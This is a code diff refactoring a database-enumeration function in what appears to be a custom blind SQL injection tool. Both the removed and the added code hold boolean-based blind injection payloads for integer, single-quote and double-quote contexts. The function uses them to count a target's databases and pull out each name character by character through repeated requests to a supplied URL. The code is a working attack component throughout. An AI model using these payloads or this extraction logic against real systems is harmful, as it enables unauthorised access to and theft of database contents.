@@ -186,39 +186,44 @@ def identify_db(url, get_param, cookies, injectable):
     print(Fore.CYAN + 'Identifying databases ...')
     time.sleep(0.75)
 
-    payload_db = ''
-    payload_length = ''
-    payload_name = ''
-    _injectable = injectable.replace(' ', '_')
+    payloads = {
+        'integers': {
+            'db': "1 and (select count(schema_name) from information_schema.schemata)=iterate -- -",
+            'length': "1 and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -",
+            'name': "1 and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
+        },
+        'simple_quotes': {
+            'db': "1' and (select count(schema_name) from information_schema.schemata)=iterate -- -",
+            'length': "1' and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -",
+            'name': "1' and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
+        },
+        'double_quotes': {
+            'db': "1\" and (select count(schema_name) from information_schema.schemata)=iterate -- -",
+            'length': "1\" and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -",
+            'name': "1\" and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
+        }
+    }
 
-    if _injectable == 'integers':
-        payload_db = "1 and (select count(schema_name) from information_schema.schemata)=iterate -- -"
-        payload_length = "1 and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
-        payload_name = "1 and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
-    elif _injectable == 'simple_quotes':
-        payload_db = "1' and (select count(schema_name) from information_schema.schemata)=iterate -- -"
-        payload_length = "1' and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
-        payload_name = "1' and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
-    elif _injectable == 'double_quotes':
-        payload_db = "1\" and (select count(schema_name) from information_schema.schemata)=iterate -- -"
-        payload_length = "1\" and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
-        payload_name = "1\" and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
-    
-    n_database = iterative_request(url, get_param, cookies, payload_db)
+    injectable_type = injectable.replace(' ', '_')
+    payload = payloads.get(injectable_type)
+    if not payload:
+        raise ValueError("Invalid injectable type")
+
+    n_database = iterative_request(url, get_param, cookies, payload['db'])
     print(Fore.LIGHTGREEN_EX + f"The number of databases is {n_database}")
 
     for i in range(n_database):
         print(Fore.LIGHTCYAN_EX + f"\t>>> Database {i+1} ...")
         time.sleep(0.75)
-        if (i == 0):
+        if i == 0:
             print(Fore.YELLOW + '\tSkipping INFORMATION_SCHEMA ...')
             continue
-        length_db = iterative_request(url, get_param, cookies, payload_length.format(i=i))
+        length_db = iterative_request(url, get_param, cookies, payload['length'].format(i=i))
         print(Fore.LIGHTCYAN_EX + f"\t>>>>> LENGTH: {length_db}")
         
         db_name = ''
-        for n_char in range(length_db):
-            db_name += iterative_request(url, get_param, cookies, payload_name.format(i=i, n_char=n_char+1), is_char=True)
+        for n_char in range(1, length_db + 1):
+            db_name += iterative_request(url, get_param, cookies, payload['name'].format(i=i, n_char=n_char), is_char=True)
         print(Fore.LIGHTCYAN_EX + f"\t>>>>> NAME: {db_name}")
         
 
